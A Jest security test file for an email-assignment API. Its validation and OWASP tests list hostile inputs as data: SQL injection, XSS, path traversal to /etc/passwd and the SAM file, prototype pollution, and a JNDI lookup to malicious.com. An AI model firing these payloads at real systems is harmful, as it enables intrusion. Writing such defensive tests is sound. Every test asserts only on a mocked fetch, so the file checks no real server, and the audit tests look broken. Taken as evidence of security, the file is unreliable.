/**
 * Security Tests for Email Assignment System
 * Tests for authentication, authorization, input validation, and data security
 */

import { testData, testDataFactory } from '@/test-utils/test-data';
import { dbHelpers } from '@/test-utils/db-helpers';

// Mock authentication
const mockAuth = {
  userId: null,
  orgId: null,
  sessionId: null,
  getToken: jest.fn(),
};

jest.mock('@clerk/nextjs', () => ({
  auth: jest.fn(() => mockAuth),
  currentUser: jest.fn(),
}));

// Mock fetch for API testing
const mockFetch = jest.fn();
global.fetch = mockFetch;

describe('Security Tests', () => {
  beforeEach(async () => {
    jest.clearAllMocks();
    await dbHelpers.setup();
    
    // Reset auth mock to authenticated state
    mockAuth.userId = 'test-user-1';
    mockAuth.orgId = 'test-org-1';
    mockAuth.sessionId = 'session-123';
    mockAuth.getToken.mockResolvedValue('valid-token-123');
  });

  afterEach(async () => {
    await dbHelpers.teardown();
  });

  describe('Authentication Tests', () => {
    it('rejects requests without authentication', async () => {
      // Clear authentication
      mockAuth.userId = null;
      mockAuth.orgId = null;

      mockFetch.mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Unauthorized' }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response.status).toBe(401);
    });

    it('validates session tokens', async () => {
      // Mock invalid token
      mockAuth.getToken.mockResolvedValue('invalid-token');

      mockFetch.mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Invalid token' }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid-token'
        },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response.status).toBe(401);
    });

    it('enforces session expiration', async () => {
      // Mock expired session
      mockAuth.getToken.mockRejectedValue(new Error('Session expired'));

      mockFetch.mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Session expired' }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response.status).toBe(401);
    });

    it('prevents token replay attacks', async () => {
      const token = 'token-123';
      const timestamp = Date.now();
      
      // First request should succeed
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ id: 'assignment-1' }),
      });

      const response1 = await fetch('/api/emails/test-email-1/assign', {
        method: 'POST',
        headers: { 
          'Authorization': `Bearer ${token}`,
          'X-Timestamp': timestamp.toString(),
        },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response1.ok).toBe(true);

      // Replay same request should be rejected
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 409,
        json: () => Promise.resolve({ error: 'Request already processed' }),
      });

      const response2 = await fetch('/api/emails/test-email-1/assign', {
        method: 'POST',
        headers: { 
          'Authorization': `Bearer ${token}`,
          'X-Timestamp': timestamp.toString(), // Same timestamp
        },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response2.status).toBe(409);
    });
  });

  describe('Authorization Tests', () => {
    it('enforces organization-based access control', async () => {
      // User from different organization
      mockAuth.orgId = 'different-org';

      mockFetch.mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ error: 'Access denied' }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response.status).toBe(403);
    });

    it('validates user permissions for case access', async () => {
      // Mock restricted case
      mockFetch.mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'Insufficient permissions to access this case' 
        }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'restricted-case' }),
      });

      expect(response.status).toBe(403);
    });

    it('prevents cross-tenant data access', async () => {
      const emailFromDifferentTenant = testDataFactory.email();
      emailFromDifferentTenant.organizationId = 'different-org';

      mockFetch.mockResolvedValue({
        ok: false,
        status: 404,
        json: () => Promise.resolve({ error: 'Email not found' }),
      });

      const response = await fetch(`/api/emails/${emailFromDifferentTenant.id}/assign`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      // Should return 404 instead of 403 to avoid information disclosure
      expect(response.status).toBe(404);
    });

    it('validates bulk operation permissions', async () => {
      const emails = testDataFactory.emails(5);
      // Mix of authorized and unauthorized emails
      const emailIds = [...emails.map(e => e.id), 'unauthorized-email'];

      mockFetch.mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'Access denied to one or more emails',
          unauthorizedEmails: ['unauthorized-email']
        }),
      });

      const response = await fetch('/api/emails/bulk-assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          emailIds,
          caseId: 'test-case',
        }),
      });

      expect(response.status).toBe(403);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('validates email ID format', async () => {
      const invalidEmailIds = [
        '',
        'invalid-format!',
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'email-id; DROP TABLE emails;--',
        'x'.repeat(1000), // Too long
      ];

      for (const invalidId of invalidEmailIds) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid email ID format',
            field: 'emailId'
          }),
        });

        const response = await fetch(`/api/emails/${encodeURIComponent(invalidId)}/assign`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ caseId: 'test-case' }),
        });

        expect(response.status).toBe(400);
      }
    });

    it('validates case ID format', async () => {
      const invalidCaseIds = [
        '',
        'invalid-format!',
        '<script>alert("xss")</script>',
        'case-id\'; DROP TABLE cases;--',
        null,
        undefined,
        123, // Wrong type
      ];

      for (const invalidId of invalidCaseIds) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid case ID format',
            field: 'caseId'
          }),
        });

        const response = await fetch('/api/emails/test-email/assign', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ caseId: invalidId }),
        });

        expect(response.status).toBe(400);
      }
    });

    it('sanitizes search queries', async () => {
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        'test\'; DROP TABLE cases;--',
        '../../../etc/passwd',
        'test" OR "1"="1',
        'test${jndi:ldap://malicious.com/a}',
      ];

      for (const query of maliciousQueries) {
        mockFetch.mockResolvedValue({
          ok: true,
          json: () => Promise.resolve({ 
            cases: [],
            sanitizedQuery: query.replace(/<[^>]*>/g, ''), // Basic sanitization example
          }),
        });

        const response = await fetch(`/api/cases/search?q=${encodeURIComponent(query)}`, {
          method: 'GET',
        });

        expect(response.ok).toBe(true);
        
        const data = await response.json();
        // Verify query was sanitized
        expect(data.sanitizedQuery).not.toContain('<script>');
        expect(data.sanitizedQuery).not.toContain('DROP TABLE');
      }
    });

    it('validates JSON payloads', async () => {
      const maliciousPayloads = [
        '{"__proto__":{"admin":true}}', // Prototype pollution
        '{"constructor":{"prototype":{"admin":true}}}',
        JSON.stringify({ caseId: 'test', ['__proto__']: { admin: true } }),
        'invalid json{',
        JSON.stringify({ caseId: 'x'.repeat(10000) }), // Too large
      ];

      for (const payload of maliciousPayloads) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid JSON payload' 
          }),
        });

        const response = await fetch('/api/emails/test-email/assign', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload,
        });

        expect(response.status).toBe(400);
      }
    });

    it('validates file upload security', async () => {
      const maliciousFiles = [
        { name: 'test.exe', type: 'application/x-executable' },
        { name: 'script.js', type: 'application/javascript' },
        { name: '../../../etc/passwd', type: 'text/plain' },
        { name: 'test.php', type: 'application/x-php' },
        { name: 'payload.svg', type: 'image/svg+xml' }, // SVG can contain scripts
      ];

      for (const file of maliciousFiles) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'File type not allowed',
            allowedTypes: ['pdf', 'doc', 'docx', 'txt', 'jpg', 'png']
          }),
        });

        const formData = new FormData();
        formData.append('file', new Blob(['content']), file.name);

        const response = await fetch('/api/emails/test-email/attachments', {
          method: 'POST',
          body: formData,
        });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Data Protection Tests', () => {
    it('encrypts sensitive data in storage', async () => {
      const email = testDataFactory.email();
      email.body = 'This is confidential client information';

      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({
          id: 'assignment-123',
          storageLocation: 'encrypted://bucket/path',
          encrypted: true,
        }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          caseId: 'test-case',
          storeContent: true 
        }),
      });

      const data = await response.json();
      expect(data.encrypted).toBe(true);
      expect(data.storageLocation).toContain('encrypted://');
    });

    it('masks sensitive data in logs', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      const sensitiveData = {
        emailId: 'test-email',
        caseId: 'test-case',
        userEmail: 'user@example.com',
        clientSSN: '123-45-6789',
      };

      // Simulate logging operation
      console.log('Assignment request:', {
        ...sensitiveData,
        userEmail: sensitiveData.userEmail.replace(/(.{2}).*@/, '$1***@'),
        clientSSN: sensitiveData.clientSSN.replace(/\d{3}-\d{2}-(\d{4})/, '***-**-$1'),
      });

      const logCall = consoleSpy.mock.calls[0][1];
      expect(logCall.userEmail).toContain('***');
      expect(logCall.clientSSN).toContain('***');
      expect(logCall.userEmail).not.toContain('user@example.com');

      consoleSpy.mockRestore();
    });

    it('implements proper data retention policies', async () => {
      const oldDate = new Date(Date.now() - 8 * 365 * 24 * 60 * 60 * 1000); // 8 years ago
      
      mockFetch.mockResolvedValue({
        ok: false,
        status: 410,
        json: () => Promise.resolve({ 
          error: 'Data has been archived due to retention policy',
          retentionPeriod: '7 years',
          archivedDate: oldDate.toISOString(),
        }),
      });

      const response = await fetch('/api/emails/very-old-email', {
        method: 'GET',
      });

      expect(response.status).toBe(410); // Gone
    });

    it('prevents data leakage in error messages', async () => {
      mockFetch.mockResolvedValue({
        ok: false,
        status: 500,
        json: () => Promise.resolve({ 
          error: 'Internal server error',
          errorId: 'error-123',
          // Should NOT contain: database connection strings, file paths, etc.
        }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      const errorData = await response.json();
      
      // Error should not contain sensitive information
      expect(errorData.error).not.toContain('password');
      expect(errorData.error).not.toContain('database');
      expect(errorData.error).not.toContain('/var/www');
      expect(errorData.error).not.toContain('connection string');
      
      // Should have safe error ID for tracking
      expect(errorData.errorId).toMatch(/^error-\w+$/);
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('enforces rate limiting on API endpoints', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => i);
      
      let successCount = 0;
      let rateLimitedCount = 0;

      for (const i of requests) {
        if (i < 50) {
          mockFetch.mockResolvedValueOnce({
            ok: true,
            json: () => Promise.resolve({ id: `assignment-${i}` }),
          });
          successCount++;
        } else {
          mockFetch.mockResolvedValueOnce({
            ok: false,
            status: 429,
            json: () => Promise.resolve({ 
              error: 'Rate limit exceeded',
              retryAfter: 60,
              limit: 50,
              window: '1 hour',
            }),
          });
          rateLimitedCount++;
        }

        const response = await fetch('/api/emails/test-email/assign', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ caseId: 'test-case' }),
        });

        if (i >= 50) {
          expect(response.status).toBe(429);
        }
      }

      expect(successCount).toBe(50);
      expect(rateLimitedCount).toBe(50);
    });

    it('protects against bulk operation abuse', async () => {
      const tooManyEmails = Array.from({ length: 10000 }, (_, i) => `email-${i}`);

      mockFetch.mockResolvedValue({
        ok: false,
        status: 413,
        json: () => Promise.resolve({ 
          error: 'Request too large',
          maxBulkSize: 1000,
          provided: 10000,
        }),
      });

      const response = await fetch('/api/emails/bulk-assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          emailIds: tooManyEmails,
          caseId: 'test-case',
        }),
      });

      expect(response.status).toBe(413); // Payload too large
    });

    it('implements request timeout protection', async () => {
      mockFetch.mockImplementation(() => 
        new Promise((resolve, reject) => {
          setTimeout(() => {
            reject(new Error('Request timeout'));
          }, 35000); // 35 seconds - should timeout at 30
        })
      );

      try {
        await fetch('/api/emails/bulk-assign', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            emailIds: ['test-email'],
            caseId: 'test-case',
          }),
        });
      } catch (error) {
        expect(error.message).toContain('timeout');
      }
    });
  });

  describe('OWASP Top 10 Security Tests', () => {
    it('prevents SQL injection attacks', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE emails;--",
        "' OR '1'='1",
        "' UNION SELECT * FROM users;--",
        "'; INSERT INTO admin_users VALUES('attacker');--",
      ];

      for (const injection of sqlInjectionAttempts) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid input detected',
            type: 'VALIDATION_ERROR'
          }),
        });

        const response = await fetch(`/api/cases/search?q=${encodeURIComponent(injection)}`, {
          method: 'GET',
        });

        expect(response.status).toBe(400);
      }
    });

    it('prevents XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg/onload=alert("xss")>',
        '"><script>alert("xss")</script>',
      ];

      for (const payload of xssPayloads) {
        mockFetch.mockResolvedValue({
          ok: true,
          json: () => Promise.resolve({ 
            cases: [],
            query: payload.replace(/[<>]/g, ''), // Sanitized output
          }),
        });

        const response = await fetch(`/api/cases/search?q=${encodeURIComponent(payload)}`, {
          method: 'GET',
        });

        const data = await response.json();
        expect(data.query).not.toContain('<script>');
        expect(data.query).not.toContain('javascript:');
      }
    });

    it('prevents CSRF attacks', async () => {
      // Request without proper CSRF token should fail
      mockFetch.mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'CSRF token missing or invalid' 
        }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Referer': 'https://malicious-site.com',
        },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(response.status).toBe(403);
    });

    it('validates secure headers', async () => {
      const securityHeaders = {
        'Content-Security-Policy': "default-src 'self'",
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'Strict-Transport-Security': 'max-age=31536000',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
      };

      mockFetch.mockResolvedValue({
        ok: true,
        headers: new Headers(securityHeaders),
        json: () => Promise.resolve({ id: 'assignment-1' }),
      });

      const response = await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      Object.entries(securityHeaders).forEach(([header, value]) => {
        expect(response.headers.get(header)).toBe(value);
      });
    });

    it('prevents directory traversal attacks', async () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
      ];

      for (const path of traversalAttempts) {
        mockFetch.mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid file path' 
          }),
        });

        const response = await fetch(`/api/emails/test-email/attachments/${encodeURIComponent(path)}`, {
          method: 'GET',
        });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Audit and Compliance Tests', () => {
    it('logs security events', async () => {
      const auditSpy = jest.fn();
      
      // Mock audit logging
      global.auditLog = auditSpy;

      mockFetch.mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ error: 'Unauthorized' }),
      });

      // Clear auth for unauthorized access attempt
      mockAuth.userId = null;

      await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      // Should log security event
      expect(auditSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          event: 'UNAUTHORIZED_ACCESS_ATTEMPT',
          endpoint: '/api/emails/test-email/assign',
          timestamp: expect.any(String),
          ipAddress: expect.any(String),
        })
      );
    });

    it('maintains data access audit trail', async () => {
      const auditSpy = jest.fn();
      global.auditLog = auditSpy;

      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ id: 'assignment-1' }),
      });

      await fetch('/api/emails/test-email/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ caseId: 'test-case' }),
      });

      expect(auditSpy).toHaveBeenCalledWith(
        expect.objectContaining({
          event: 'EMAIL_ASSIGNMENT_CREATED',
          userId: 'test-user-1',
          resourceId: 'test-email',
          action: 'ASSIGN',
          timestamp: expect.any(String),
        })
      );
    });

    it('enforces GDPR compliance for data deletion', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ 
          deleted: true,
          gdprCompliant: true,
          deletedData: [
            'email_content',
            'attachments', 
            'personal_identifiers',
            'audit_logs',
          ],
        }),
      });

      const response = await fetch('/api/emails/test-email', {
        method: 'DELETE',
        headers: { 
          'X-GDPR-Request': 'true',
          'X-User-Consent': 'verified',
        },
      });

      const data = await response.json();
      expect(data.gdprCompliant).toBe(true);
      expect(data.deletedData).toContain('personal_identifiers');
    });
  });
});